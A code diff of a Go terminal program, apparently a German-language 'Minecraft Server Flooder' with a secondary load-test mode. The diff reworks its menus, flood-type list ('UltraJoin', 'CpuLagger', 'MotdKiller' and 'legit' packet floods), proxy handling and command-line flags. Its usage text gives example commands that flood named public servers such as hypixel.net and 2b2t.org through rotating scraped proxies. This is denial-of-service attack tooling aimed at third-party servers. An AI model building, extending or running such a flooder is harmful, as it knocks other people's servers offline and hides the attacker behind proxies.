@@ -1,8 +1,10 @@
 package main
 
 import (
+	"context"
 	"flag"
 	"fmt"
+	"loadtest/minecraft_legit"
 	"os"
 	"strconv"
 	"strings"
@@ -12,6 +14,15 @@ import (
 	"github.com/charmbracelet/lipgloss"
 	"loadtest/utils"
 )
+
+type ProxyConfig struct {
+	Protocol string
+	Host     string
+	Port     string
+	Username string
+	Password string
+	Type     string
+}
 
 // Styles
 var (
@@ -76,15 +87,10 @@ type model struct {
 
 func initialModel() model {
 	return model{
-		screen:      modeSelection,
-		choices:     []string{"Normaler Load-Test", "Minecraft Server Flooder"},
-		workers:     10,
-		rps:         50,
-		duration:    30 * time.Second,
-		useRotating: true,
-		proxyBuffer: []string{},
-		width:       80,
-		height:      24,
+		screen:  modeSelection,
+		choices: []string{"Minecraft Server Flooder", "Load-Test"},
+		workers: 50,
+		rps:     100,
 	}
 }
 
@@ -104,7 +110,7 @@ func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 		}
 
 		switch msg.String() {
-		case "ctrl+c":
+		case "ctrl+c", "q":
 			m.quitting = true
 			return m, tea.Quit
 
@@ -130,11 +136,8 @@ func (m model) handleInput(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 	switch msg.String() {
 	case "enter":
 		if m.screen == proxyInput {
-			m.proxyBuffer = append(m.proxyBuffer, m.input)
-			m.input = ""
-			return m, nil
+			return m.processProxyInput()
 		}
-		m.inputMode = false
 		return m.processInput()
 	case "ctrl+c":
 		m.quitting = true
@@ -146,12 +149,6 @@ func (m model) handleInput(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 			m.input = m.input[:len(m.input)-1]
 		}
 	case "esc":
-		if m.screen == proxyInput && len(m.proxyBuffer) > 0 {
-			// Proxy-Eingabe abschließen
-			m.inputMode = false
-			m.input = ""
-			return m.processProxyInput()
-		}
 		m.inputMode = false
 		m.input = ""
 	default:
@@ -164,22 +161,20 @@ func (m model) handleInput(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 
 func (m model) processProxyInput() (tea.Model, tea.Cmd) {
 	if len(m.proxyBuffer) == 0 {
-		m.screen = workerConfig
-		m.inputMode = true
+		m.proxyBuffer = append(m.proxyBuffer, m.input)
 		m.input = ""
 		return m, nil
 	}
 
-	// Parse Proxy-Liste
 	proxyText := strings.Join(m.proxyBuffer, "\n")
 	parsedProxies, err := parseProxyList(proxyText)
 	if err != nil {
-		utils.Warning("Fehler beim Parsen der Proxy-Liste: %v", err)
-	} else {
-		m.proxies = append(m.proxies, parsedProxies...)
-		utils.Info("%d Proxys erfolgreich hinzugefügt", len(parsedProxies))
+		m.err = err
+		return m, nil
 	}
 
+	m.proxies = parsedProxies
+	m.inputMode = false
 	m.proxyBuffer = []string{}
 	m.screen = workerConfig
 	m.inputMode = true
@@ -190,57 +185,55 @@ func (m model) processProxyInput() (tea.Model, tea.Cmd) {
 func (m model) processInput() (tea.Model, tea.Cmd) {
 	switch m.screen {
 	case minecraftServerConfig:
-		if m.input != "" {
-			m.servers = strings.Split(m.input, ",")
-			for i := range m.servers {
-				m.servers[i] = strings.TrimSpace(m.servers[i])
-			}
-		} else {
-			m.servers = []string{"hypixel.net", "mc.hypixel.net", "2b2t.org", "mineplex.com", "gommehd.net", "cubecraft.net"}
+		servers := strings.Split(m.input, ",")
+		for i := range servers {
+			servers[i] = strings.TrimSpace(servers[i])
 		}
-		m.input = ""
+		m.servers = servers
+		m.inputMode = false
 		m.screen = proxyConfig
-		m.choices = []string{"Keine Proxies", "ProxyScrape SOCKS5", "ProxyScrape HTTP", "ProxyScrape ALL", "Datei laden", "Manuelle Eingabe"}
 		m.cursor = 0
+		m.choices = []string{"Proxys verwenden", "Keine Proxys"}
 
 	case loadTestServerConfig:
-		if m.input != "" {
-			m.servers = []string{m.input}
-		} else {
-			m.servers = []string{"example.com:80"}
-		}
-		m.input = ""
+		m.servers = []string{strings.TrimSpace(m.input)}
+		m.inputMode = false
 		m.screen = proxyConfig
-		m.choices = []string{"Keine Proxies", "ProxyScrape SOCKS5", "ProxyScrape HTTP", "ProxyScrape ALL", "Datei laden", "Manuelle Eingabe"}
 		m.cursor = 0
+		m.choices = []string{"Proxys verwenden", "Keine Proxys"}
 
 	case workerConfig:
-		if m.input != "" {
-			if w, err := strconv.Atoi(m.input); err == nil && w > 0 {
-				m.workers = w
-			}
+		workers, err := strconv.Atoi(m.input)
+		if err != nil || workers <= 0 {
+			m.err = fmt.Errorf("ungültige Worker-Anzahl")
+			return m, nil
 		}
-		m.input = ""
+		m.workers = workers
+		m.inputMode = false
 		m.screen = rpsConfig
 		m.inputMode = true
+		m.input = ""
 
 	case rpsConfig:
-		if m.input != "" {
-			if r, err := strconv.Atoi(m.input); err == nil && r > 0 {
-				m.rps = r
-			}
+		rps, err := strconv.Atoi(m.input)
+		if err != nil || rps <= 0 {
+			m.err = fmt.Errorf("ungültige RPS-Anzahl")
+			return m, nil
 		}
-		m.input = ""
+		m.rps = rps
+		m.inputMode = false
 		m.screen = durationConfig
 		m.inputMode = true
+		m.input = ""
 
 	case durationConfig:
-		if m.input != "" {
-			if d, err := strconv.Atoi(m.input); err == nil && d > 0 {
-				m.duration = time.Duration(d) * time.Second
-			}
+		duration, err := strconv.Atoi(m.input)
+		if err != nil || duration <= 0 {
+			m.err = fmt.Errorf("ungültige Dauer")
+			return m, nil
 		}
-		m.input = ""
+		m.duration = time.Duration(duration) * time.Second
+		m.inputMode = false
 		return m.startTest()
 	}
 
@@ -250,17 +243,15 @@ func (m model) processInput() (tea.Model, tea.Cmd) {
 func (m model) handleEnter() (tea.Model, tea.Cmd) {
 	switch m.screen {
 	case modeSelection:
-		switch m.cursor {
-		case 0:
-			m.mode = "loadtest"
+		m.mode = []string{"minecraft", "loadtest"}[m.cursor]
+		if m.mode == "minecraft" {
+			m.screen = minecraftFloodTypeSelection
+			m.cursor = 0
+			m.choices = getFloodTypeChoices()
+		} else {
 			m.screen = loadTestServerConfig
 			m.inputMode = true
 			m.input = ""
-		case 1:
-			m.mode = "minecraft"
-			m.screen = minecraftFloodTypeSelection
-			m.choices = getFloodTypeChoices()
-			m.cursor = 0
 		}
 
 	case minecraftFloodTypeSelection:
@@ -270,41 +261,27 @@ func (m model) handleEnter() (tea.Model, tea.Cmd) {
 		m.input = ""
 
 	case minecraftServerConfig:
-		return m.processInput()
+		servers := strings.Split(m.input, ",")
+		for i := range servers {
+			servers[i] = strings.TrimSpace(servers[i])
+		}
+		m.servers = servers
+		m.inputMode = false
+		m.screen = proxyConfig
+		m.cursor = 0
+		m.choices = []string{"Proxys verwenden", "Keine Proxys"}
 
 	case proxyConfig:
-		switch m.cursor {
-		case 0:
-			m.proxies = []ProxyConfig{}
-			m.screen = workerConfig
-			m.inputMode = true
-			m.input = ""
-		case 1:
-			m.proxies = loadProxiesFromProxyScrape("socks5")
-			m.screen = workerConfig
-			m.inputMode = true
-			m.input = ""
-		case 2:
-			m.proxies = loadProxiesFromProxyScrape("http")
-			m.screen = workerConfig
-			m.inputMode = true
-			m.input = ""
-		case 3:
-			m.proxies = loadProxiesFromProxyScrape("all")
-			m.screen = workerConfig
-			m.inputMode = true
-			m.input = ""
-		case 4:
-			// Datei laden
-			m.screen = workerConfig
-			m.inputMode = true
-			m.input = ""
-		case 5:
-			// Manuelle Eingabe
+		if m.cursor == 0 {
 			m.screen = proxyInput
 			m.inputMode = true
 			m.input = ""
 			m.proxyBuffer = []string{}
+		} else {
+			m.proxies = []ProxyConfig{}
+			m.screen = workerConfig
+			m.inputMode = true
+			m.input = ""
 		}
 	}
 
@@ -315,23 +292,12 @@ func (m model) startTest() (tea.Model, tea.Cmd) {
 	m.screen = running
 
 	if m.mode == "minecraft" {
-		go func() {
+		if strings.HasPrefix(m.floodType, "legit_") {
+			runMinecraftLegit(m.servers, m.workers, m.duration, m.floodType, m.proxies, m.useRotating)
+		} else {
 			flooder := NewMinecraftFlooder(m.servers, m.proxies, m.useRotating, m.workers, m.duration, m.floodType)
 			utils.StartWithErrorHandling(flooder)
-		}()
-	} else {
-		go func() {
-			tester, err := NewLoadTester(m.servers[0], m.workers, m.rps, m.duration)
-			if err != nil {
-				utils.Error("Fehler beim Erstellen des Load Testers: %v", err)
-				return
-			}
-			tester.useRotating = m.useRotating
-			for _, p := range m.proxies {
-				_ = tester.AddProxy(p.Protocol, p.Host, p.Port, p.Username, p.Password, "")
-			}
-			tester.Start()
-		}()
+		}
 	}
 
 	time.Sleep(2 * time.Second)
@@ -340,7 +306,7 @@ func (m model) startTest() (tea.Model, tea.Cmd) {
 
 func centerText(text string, width int) string {
 	if width <= 0 {
-		width = 80
+		return text
 	}
 	textWidth := len(text)
 	if textWidth >= width {
@@ -352,151 +318,135 @@ func centerText(text string, width int) string {
 
 func (m model) View() string {
 	if m.quitting {
-		return centerText("Auf Wiedersehen!", m.width) + "\n"
+		return "Programm wird beendet...\n"
 	}
 
 	var s strings.Builder
 
 	switch m.screen {
 	case modeSelection:
-		s.WriteString(centerText(titleStyle.Render("SERVER LASTTEST & MINECRAFT PINGER"), m.width))
+		s.WriteString(titleStyle.Render("SERVER LOADTEST & MINECRAFT PINGER"))
 		s.WriteString("\n\n")
-		s.WriteString(centerText(titleStyle.Render("TEST MODUS AUSWAHL"), m.width))
-		s.WriteString("\n")
-		s.WriteString(centerText(strings.Repeat("=", 30), m.width))
+		s.WriteString(infoStyle.Render("Wähle den Modus:"))
 		s.WriteString("\n\n")
-
 		for i, choice := range m.choices {
 			cursor := " "
 			if m.cursor == i {
 				cursor = ">"
-				s.WriteString(centerText(fmt.Sprintf("%s %s", cursor, selectedStyle.Render(choice)), m.width))
+				s.WriteString(selectedStyle.Render(cursor + " " + choice))
 			} else {
-				s.WriteString(centerText(fmt.Sprintf("%s %s", cursor, normalStyle.Render(choice)), m.width))
+				s.WriteString(normalStyle.Render(cursor + " " + choice))
 			}
 			s.WriteString("\n")
 		}
 
 	case minecraftFloodTypeSelection:
-		s.WriteString(centerText(titleStyle.Render("FLOOD-TYP AUSWAHL"), m.width))
-		s.WriteString("\n")
-		s.WriteString(centerText(strings.Repeat("-", 30), m.width))
+		s.WriteString(titleStyle.Render("MINECRAFT FLOOD-TYP"))
 		s.WriteString("\n\n")
-
+		s.WriteString(infoStyle.Render("Wähle den Flood-Typ:"))
+		s.WriteString("\n\n")
 		for i, choice := range m.choices {
 			cursor := " "
 			if m.cursor == i {
 				cursor = ">"
-				s.WriteString(centerText(fmt.Sprintf("%s %s", cursor, selectedStyle.Render(choice)), m.width))
+				s.WriteString(selectedStyle.Render(cursor + " " + choice))
 			} else {
-				s.WriteString(centerText(fmt.Sprintf("%s %s", cursor, normalStyle.Render(choice)), m.width))
+				s.WriteString(normalStyle.Render(cursor + " " + choice))
 			}
 			s.WriteString("\n")
 		}
 
 	case minecraftServerConfig:
-		s.WriteString(centerText(titleStyle.Render("SERVER KONFIGURATION"), m.width))
-		s.WriteString("\n")
-		s.WriteString(centerText(strings.Repeat("-", 30), m.width))
+		s.WriteString(titleStyle.Render("MINECRAFT SERVER KONFIGURATION"))
 		s.WriteString("\n\n")
-		s.WriteString(centerText(promptStyle.Render("Server eingeben (kommasepariert) [Standard Server]: "), m.width))
+		s.WriteString(promptStyle.Render("Gib die Server ein (Komma-getrennt):"))
 		s.WriteString("\n")
-		s.WriteString(centerText(m.input, m.width))
+		s.WriteString(infoStyle.Render("Beispiel: hypixel.net:25565,2b2t.org:25565"))
+		s.WriteString("\n\n")
+		s.WriteString("> " + m.input)
 
 	case loadTestServerConfig:
-		s.WriteString(centerText(titleStyle.Render("SERVER KONFIGURATION"), m.width))
+		s.WriteString(titleStyle.Render("LOAD-TEST KONFIGURATION"))
 		s.WriteString("\n\n")
-		s.WriteString(centerText(promptStyle.Render("Zielserver (host:port) [example.com:80]: "), m.width))
+		s.WriteString(promptStyle.Render("Gib den Ziel-Server ein:"))
 		s.WriteString("\n")
-		s.WriteString(centerText(m.input, m.width))
+		s.WriteString(infoStyle.Render("Beispiel: example.com:80"))
+		s.WriteString("\n\n")
+		s.WriteString("> " + m.input)
 
 	case proxyConfig:
-		s.WriteString(centerText(titleStyle.Render("PROXY KONFIGURATION"), m.width))
+		s.WriteString(titleStyle.Render("PROXY KONFIGURATION"))
 		s.WriteString("\n\n")
-
+		s.WriteString(infoStyle.Render("Möchtest du Proxys verwenden?"))
+		s.WriteString("\n\n")
 		for i, choice := range m.choices {
 			cursor := " "
 			if m.cursor == i {
 				cursor = ">"
-				s.WriteString(centerText(fmt.Sprintf("%s %s", cursor, selectedStyle.Render(choice)), m.width))
+				s.WriteString(selectedStyle.Render(cursor + " " + choice))
 			} else {
-				s.WriteString(centerText(fmt.Sprintf("%s %s", cursor, normalStyle.Render(choice)), m.width))
+				s.WriteString(normalStyle.Render(cursor + " " + choice))
 			}
 			s.WriteString("\n")
 		}
 
 	case proxyInput:
-		s.WriteString(centerText(titleStyle.Render("PROXY EINGABE"), m.width))
+		s.WriteString(titleStyle.Render("PROXY EINGABE"))
 		s.WriteString("\n\n")
-		s.WriteString(centerText(promptStyle.Render("Proxys eingeben (ein Proxy pro Enter):"), m.width))
+		s.WriteString(promptStyle.Render("Füge Proxys ein (ein Proxy pro Zeile):"))
 		s.WriteString("\n")
-		s.WriteString(centerText(infoStyle.Render("Format: protocol://host:port oder host:port"), m.width))
+		s.WriteString(infoStyle.Render("Format: protokoll://host:port oder host:port"))
 		s.WriteString("\n")
-		s.WriteString(centerText(infoStyle.Render("Mit Auth: protocol://user:pass@host:port"), m.width))
+		s.WriteString(infoStyle.Render("Drücke Enter zum Fortfahren"))
 		s.WriteString("\n\n")
-
 		if len(m.proxyBuffer) > 0 {
-			s.WriteString(centerText(fmt.Sprintf("Eingegebene Proxys: %d", len(m.proxyBuffer)), m.width))
-			s.WriteString("\n\n")
+			s.WriteString("Eingefügte Proxys:\n")
+			for _, proxy := range m.proxyBuffer {
+				s.WriteString("  " + proxy + "\n")
+			}
 		}
-
-		s.WriteString(centerText("> "+m.input, m.width))
+		s.WriteString("> " + m.input)
 
 	case workerConfig:
-		s.WriteString(centerText(titleStyle.Render("WORKER KONFIGURATION"), m.width))
+		s.WriteString(titleStyle.Render("WORKER KONFIGURATION"))
 		s.WriteString("\n\n")
-		s.WriteString(centerText(promptStyle.Render(fmt.Sprintf("Anzahl Worker [%d]: ", m.workers)), m.width))
+		s.WriteString(promptStyle.Render("Gib die Anzahl der Worker ein:"))
 		s.WriteString("\n")
-		s.WriteString(centerText(m.input, m.width))
+		s.WriteString(infoStyle.Render("Empfohlen: 50-200"))
+		s.WriteString("\n\n")
+		s.WriteString("> " + m.input)
 
 	case rpsConfig:
-		s.WriteString(centerText(titleStyle.Render("RPS KONFIGURATION"), m.width))
+		s.WriteString(titleStyle.Render("RPS KONFIGURATION"))
 		s.WriteString("\n\n")
-		if m.mode == "minecraft" {
-			s.WriteString(centerText(promptStyle.Render(fmt.Sprintf("Floods pro Sekunde [%d]: ", m.rps)), m.width))
-		} else {
-			s.WriteString(centerText(promptStyle.Render(fmt.Sprintf("Requests pro Sekunde [%d]: ", m.rps)), m.width))
-		}
+		s.WriteString(promptStyle.Render("Gib die Anfragen pro Sekunde ein:"))
 		s.WriteString("\n")
-		s.WriteString(centerText(m.input, m.width))
+		s.WriteString(infoStyle.Render("Empfohlen: 100-500"))
+		s.WriteString("\n\n")
+		s.WriteString("> " + m.input)
 
 	case durationConfig:
-		s.WriteString(centerText(titleStyle.Render("DAUER KONFIGURATION"), m.width))
+		s.WriteString(titleStyle.Render("DAUER KONFIGURATION"))
 		s.WriteString("\n\n")
-		s.WriteString(centerText(promptStyle.Render(fmt.Sprintf("Testdauer in Sekunden [%d]: ", int(m.duration.Seconds()))), m.width))
+		s.WriteString(promptStyle.Render("Gib die Testdauer in Sekunden ein:"))
 		s.WriteString("\n")
-		s.WriteString(centerText(m.input, m.width))
+		s.WriteString(infoStyle.Render("Empfohlen: 30-300"))
+		s.WriteString("\n\n")
+		s.WriteString("> " + m.input)
 
 	case running:
-		s.WriteString(centerText(titleStyle.Render("TEST LÄUFT"), m.width))
+		s.WriteString(titleStyle.Render("TEST LÄUFT"))
 		s.WriteString("\n\n")
-		s.WriteString(centerText(infoStyle.Render(fmt.Sprintf("Modus: %s", m.mode)), m.width))
+		s.WriteString(infoStyle.Render("Der Test wird ausgeführt..."))
 		s.WriteString("\n")
-		s.WriteString(centerText(infoStyle.Render(fmt.Sprintf("Server: %d", len(m.servers))), m.width))
-		s.WriteString("\n")
-		s.WriteString(centerText(infoStyle.Render(fmt.Sprintf("Worker: %d", m.workers)), m.width))
-		s.WriteString("\n")
-		s.WriteString(centerText(infoStyle.Render(fmt.Sprintf("RPS: %d", m.rps)), m.width))
-		s.WriteString("\n")
-		s.WriteString(centerText(infoStyle.Render(fmt.Sprintf("Dauer: %v", m.duration)), m.width))
-		s.WriteString("\n")
-		s.WriteString(centerText(infoStyle.Render(fmt.Sprintf("Proxys: %d", len(m.proxies))), m.width))
-		s.WriteString("\n")
-		if m.mode == "minecraft" {
-			s.WriteString(centerText(infoStyle.Render(fmt.Sprintf("Flood-Typ: %s", m.floodType)), m.width))
-			s.WriteString("\n")
-		}
+		s.WriteString(infoStyle.Render("Überprüfe die Logs für Details."))
 	}
 
 	s.WriteString("\n")
 	if m.inputMode {
-		if m.screen == proxyInput {
-			s.WriteString(centerText(helpStyle.Render("(ESC: Fertig • Enter: Proxy hinzufügen • Ctrl+V: Einfügen • Ctrl+C: Beenden)"), m.width))
-		} else {
-			s.WriteString(centerText(helpStyle.Render("(ESC: Abbrechen • Enter: Bestätigen • Ctrl+V: Einfügen • Ctrl+C: Beenden)"), m.width))
-		}
+		s.WriteString(helpStyle.Render("\nESC: Abbrechen | Ctrl+C: Beenden"))
 	} else {
-		s.WriteString(centerText(helpStyle.Render("(↑/↓: Navigation • Enter: Auswählen • q: Beenden)"), m.width))
+		s.WriteString(helpStyle.Render("\n↑/↓: Navigieren | Enter: Auswählen | Q/Ctrl+C: Beenden"))
 	}
 	s.WriteString("\n")
 
@@ -505,25 +455,37 @@ func (m model) View() string {
 
 func getFloodTypeChoices() []string {
 	return []string{
-		"1. Localhost Attack", "2. Name Null Ping", "3. Boss Handler", "4. Fake Premium Join",
-		"5. Bot Null Ping", "6. Ultra Join", "7. UFO Attack", "8. nAntibot",
-		"9. 2LS Bypass", "10. Multi Killer", "11. Aegis Killer", "12. CPU Lagger",
-		"13. Destroyer", "14. ID Error", "15. Fake Host", "16. Pro Auth Killer",
-		"17. Standard Flood", "18. Join Bots", "19. Bot Fucker", "20. Consola",
-		"21. Paola", "22. TimeOut Killer", "23. CPU Burner 6", "24. CPU Ripper",
-		"25. Fake Join", "26. Fast Join", "27. MOTD Killer", "28. Legacy MOTD", "29. Byte Attack",
+		"UltraJoin (Massenhafte Joins)",
+		"MotdKiller (MOTD Spam)",
+		"CpuLagger (CPU Überlastung)",
+		"FakeJoin (Fake Player Joins)",
+		"BotJoin (Bot-Netzwerk)",
+		"Legit: Authentication Request",
+		"Legit: Real MOTD Request",
+		"Legit: Big String",
+		"Legit: Encryption Error",
+		"Legit: Handshake",
+		"Legit: Login Request",
+		"Legit: Random Byte",
+		"Legit: Status Request",
 	}
 }
 
 func getFloodTypeFromIndex(i int) string {
 	types := []string{
-		"localhost", "namenullping", "bosshandler", "fakepremium_join",
-		"botnullping", "ultrajoin", "ufo", "nAntibot",
-		"2lsbypass", "multikiller", "aegiskiller", "cpulagger",
-		"destroyer", "IDERROR", "fakehost", "proauthkiller",
-		"flood", "joinbots", "botfucker", "consola",
-		"paola", "TimeOutKiller", "cpuburner6", "cpuRipper",
-		"fakejoin", "fastjoin", "motdkiller", "legacy_motd", "byte",
+		"ultrajoin",
+		"motdkiller",
+		"cpulagger",
+		"fakejoin",
+		"botjoin",
+		"legit_authentication",
+		"legit_motd",
+		"legit_bigstring",
+		"legit_encryption",
+		"legit_handshake",
+		"legit_login",
+		"legit_random",
+		"legit_status",
 	}
 	if i < len(types) {
 		return types[i]
@@ -533,22 +495,23 @@ func getFloodTypeFromIndex(i int) string {
 
 func main() {
 	var (
-		mode            = flag.String("mode", "", "Test-Modus: 'loadtest' oder 'minecraft'")
-		servers         = flag.String("servers", "", "Zielserver (kommasepariert)")
-		workers         = flag.Int("workers", 0, "Anzahl Worker")
-		rps             = flag.Int("rps", 0, "Requests/Floods pro Sekunde")
-		duration        = flag.Int("duration", 0, "Testdauer in Sekunden")
-		floodType       = flag.String("flood-type", "", "Minecraft Flood-Typ")
-		proxyFile       = flag.String("proxy-file", "", "Pfad zur Proxy-Datei")
-		proxyList       = flag.String("proxy-list", "", "Proxy-Liste (kommasepariert)")
-		proxyProtocol   = flag.String("proxy-protocol", "socks5", "Proxy-Protokoll")
-		useRotating     = flag.Bool("rotating", true, "Rotating Proxys verwenden")
-		testProxies     = flag.Bool("test-proxies", false, "Proxys testen")
-		proxyScrape     = flag.Bool("proxy-scrape", false, "Proxys von ProxyScrape laden")
-		proxyScrapeType = flag.String("proxy-scrape-type", "all", "ProxyScrape Typ")
-		debugLog        = flag.Bool("debug", false, "Debug-Logging aktivieren")
-		fileLog         = flag.Bool("log-file", false, "Logging in Datei")
-		help            = flag.Bool("help", false, "Hilfe anzeigen")
+		mode               = flag.String("mode", "", "Modus: minecraft, loadtest")
+		serverList         = flag.String("servers", "", "Komma-getrennte Server-Liste")
+		workers            = flag.Int("workers", 50, "Anzahl der Worker")
+		rpsVal             = flag.Int("rps", 100, "Anfragen pro Sekunde")
+		durationVal        = flag.Int("duration", 60, "Testdauer in Sekunden")
+		floodTypeVal       = flag.String("flood-type", "", "Flood-Typ für Minecraft")
+		proxyFile          = flag.String("proxy-file", "", "Pfad zur Proxy-Datei")
+		proxyList          = flag.String("proxy-list", "", "Komma-getrennte Proxy-Liste")
+		proxyProtocol      = flag.String("proxy-protocol", "socks5", "Standard Proxy-Protokoll")
+		useRotatingProxies = flag.Bool("use-rotating", true, "Proxy-Rotation aktivieren")
+		testProxiesFlag    = flag.Bool("test-proxies", false, "Proxys vor dem Start testen")
+		proxyScrapeFlag    = flag.Bool("proxy-scrape", false, "Proxys von ProxyScrape laden")
+		proxyScrapeType    = flag.String("proxy-scrape-type", "socks5", "ProxyScrape Typ: socks5, http")
+		protocolVersion    = flag.Int("protocol-version", 763, "Minecraft Protokoll-Version")
+		debugLog           = flag.Bool("debug", false, "Debug-Logging aktivieren")
+		fileLog            = flag.Bool("file-log", false, "In Datei loggen")
+		help               = flag.Bool("help", false, "Hilfe anzeigen")
 	)
 
 	flag.Parse()
@@ -560,7 +523,7 @@ func main() {
 
 	utils.SetGlobalLogLevel(logLevel)
 	if *fileLog {
-		_ = utils.EnableGlobalFileLogging("logs")
+		utils.EnableFileLogging("flooder.log")
 	}
 
 	if *help {
@@ -569,9 +532,10 @@ func main() {
 	}
 
 	if *mode != "" {
-		runWithCommandLine(*mode, *servers, *workers, *rps, *duration, *floodType,
-			*proxyFile, *proxyList, *proxyProtocol, *useRotating, *testProxies,
-			*proxyScrape, *proxyScrapeType, *debugLog, *fileLog)
+		runWithCommandLine(*mode, *serverList, *workers, *rpsVal, *durationVal,
+			*floodTypeVal, *proxyFile, *proxyList, *proxyProtocol, *useRotatingProxies,
+			*testProxiesFlag, *proxyScrapeFlag, *proxyScrapeType, *protocolVersion,
+			*debugLog, *fileLog)
 		return
 	}
 
@@ -591,17 +555,30 @@ func printUsage() {
 	fmt.Println("1. Minecraft Server Flooder:")
 	fmt.Println("   ./flooder -mode=minecraft -servers=\"hypixel.net,2b2t.org\" -workers=50 -rps=100 -duration=60 -flood-type=ultrajoin")
 	fmt.Println()
-	fmt.Println("2. Mit Proxy-Datei:")
+	fmt.Println("2. Minecraft Legit Authentication:")
+	fmt.Println("   ./flooder -mode=minecraft -servers=\"hypixel.net\" -workers=20 -duration=30 -flood-type=legit_authentication -protocol-version=763")
+	fmt.Println()
+	fmt.Println("3. Mit Proxy-Datei:")
 	fmt.Println("   ./flooder -mode=minecraft -servers=\"hypixel.net\" -workers=20 -rps=50 -duration=30 -flood-type=motdkiller -proxy-file=\"proxies.txt\"")
 	fmt.Println()
-	fmt.Println("3. Mit ProxyScrape:")
+	fmt.Println("4. Mit ProxyScrape:")
 	fmt.Println("   ./flooder -mode=minecraft -servers=\"gommehd.net\" -workers=30 -rps=75 -duration=45 -flood-type=cpulagger -proxy-scrape -proxy-scrape-type=socks5")
 	fmt.Println()
-	fmt.Println("4. Mit manueller Proxy-Liste:")
-	fmt.Println("   ./flooder -mode=minecraft -servers=\"hypixel.net\" -workers=15 -rps=25 -duration=20 -flood-type=fakejoin -proxy-list=\"proxy1.com:1080,proxy2.com:1080\"")
+	fmt.Println("5. Legit Random Byte Method:")
+	fmt.Println("   ./flooder -mode=minecraft -servers=\"hypixel.net\" -workers=15 -duration=20 -flood-type=legit_random -proxy-list=\"proxy1.com:1080,proxy2.com:1080\"")
 	fmt.Println()
-	fmt.Println("5. Load-Test:")
+	fmt.Println("6. Load-Test:")
 	fmt.Println("   ./flooder -mode=loadtest -servers=\"example.com:80\" -workers=100 -rps=200 -duration=30")
+	fmt.Println()
+	fmt.Println("MINECRAFT LEGIT METHODEN:")
+	fmt.Println("   legit_authentication  - Login-Versuch mit zufälligem Username")
+	fmt.Println("   legit_motd           - Server-Status-Anfrage")
+	fmt.Println("   legit_bigstring      - Großer zufälliger String")
+	fmt.Println("   legit_encryption     - Encryption-Fehler simulieren")
+	fmt.Println("   legit_handshake      - Nur Handshake-Paket")
+	fmt.Println("   legit_login          - Login mit Zähler")
+	fmt.Println("   legit_random         - Zufällige Bytes (5-65539)")
+	fmt.Println("   legit_status         - Status + Ping Packet")
 	fmt.Println()
 	fmt.Println("FLAGS:")
 	flag.PrintDefaults()
@@ -609,69 +586,60 @@ func printUsage() {
 
 func runWithCommandLine(mode, serverList string, workers, rpsVal, durationVal int,
 	floodTypeVal, proxyFile, proxyList, proxyProtocol string, useRotatingProxies,
-	testProxiesFlag, proxyScrapeFlag bool, proxyScrapeType string, debug, fileLog bool) {
+	testProxiesFlag, proxyScrapeFlag bool, proxyScrapeType string, protocolVersion int,
+	debug, fileLog bool) {
 
 	if serverList == "" {
-		utils.Fatal("Fehler: Server müssen angegeben werden (-servers)")
+		utils.Fatal("Server-Liste ist erforderlich. Verwende -servers=\"server1,server2\"")
 	}
 
 	if workers <= 0 {
-		workers = 10
-		utils.Info("Keine Worker angegeben, verwende Standardwert: %d", workers)
+		utils.Fatal("Worker-Anzahl muss größer als 0 sein")
 	}
 
-	if rpsVal <= 0 {
-		rpsVal = 50
-		utils.Info("Keine RPS angegeben, verwende Standardwert: %d", rpsVal)
+	if rpsVal <= 0 && mode != "minecraft" {
+		utils.Fatal("RPS muss größer als 0 sein")
 	}
 
 	if durationVal <= 0 {
-		durationVal = 30
-		utils.Info("Keine Dauer angegeben, verwende Standardwert: %d Sekunden", durationVal)
+		utils.Fatal("Dauer muss größer als 0 sein")
 	}
 
 	var proxies []ProxyConfig
 
 	if proxyScrapeFlag {
-		utils.Info("Lade Proxys von ProxyScrape (%s)...", proxyScrapeType)
 		proxies = loadProxiesFromProxyScrape(proxyScrapeType)
-		utils.Info("%d Proxys geladen", len(proxies))
 	} else if proxyFile != "" {
-		utils.Info("Lade Proxys aus Datei: %s", proxyFile)
-		var err error
-		proxies, err = loadProxiesFromFile(proxyFile)
+		loadedProxies, err := loadProxiesFromFile(proxyFile)
 		if err != nil {
 			utils.Fatal("Fehler beim Laden der Proxy-Datei: %v", err)
 		}
-		for i := range proxies {
-			if proxies[i].Protocol == "" {
-				proxies[i].Protocol = proxyProtocol
-			}
-		}
-		utils.Info("%d Proxys geladen", len(proxies))
+		proxies = loadedProxies
 	} else if proxyList != "" {
-		utils.Info("Parse manuelle Proxy-Liste...")
 		proxies = parseCommandLineProxyList(proxyList, proxyProtocol)
-		utils.Info("%d Proxys geparst", len(proxies))
 	}
 
 	if testProxiesFlag && len(proxies) > 0 {
-		utils.Info("Teste %d Proxys...", len(proxies))
-		working, _, _ := testProxiesParallel(proxies, 50)
-		utils.Info("%d von %d Proxys funktionieren", len(working), len(proxies))
-		proxies = working
+		utils.Info("Teste Proxys...")
+		workingProxies := testProxies(proxies)
+		proxies = workingProxies
+		utils.Info("Funktionierende Proxys: %d", len(proxies))
 	}
 
 	duration := time.Duration(durationVal) * time.Second
 
 	if mode == "minecraft" {
-		runMinecraftFlooderCommandLine(serverList, workers, rpsVal, duration,
-			floodTypeVal, proxies, useRotatingProxies)
+		if strings.HasPrefix(floodTypeVal, "legit_") {
+			runMinecraftLegitCommandLine(serverList, workers, duration, floodTypeVal,
+				proxies, useRotatingProxies, int32(protocolVersion))
+		} else {
+			runMinecraftFlooderCommandLine(serverList, workers, rpsVal, duration,
+				floodTypeVal, proxies, useRotatingProxies)
+		}
 	} else if mode == "loadtest" {
-		runLoadTestCommandLine(serverList, workers, rpsVal, duration,
-			proxies, useRotatingProxies)
+		runLoadTestCommandLine(serverList, workers, rpsVal, duration, proxies, useRotatingProxies)
 	} else {
-		utils.Fatal("Ungültiger Modus: %s (verwende 'loadtest' oder 'minecraft')", mode)
+		utils.Fatal("Ungültiger Modus: %s. Verwende 'minecraft' oder 'loadtest'", mode)
 	}
 }
 
@@ -683,22 +651,18 @@ func parseCommandLineProxyList(proxyList, protocol string) []ProxyConfig {
 		if entry == "" {
 			continue
 		}
-		if strings.Contains(entry, "://") {
-			parsed, err := parseProxyList(entry)
-			if err == nil && len(parsed) > 0 {
-				proxies = append(proxies, parsed...)
-			}
-		} else {
-			parts := strings.Split(entry, ":")
-			if len(parts) >= 2 {
-				proxies = append(proxies, ProxyConfig{
-					Host:     parts[0],
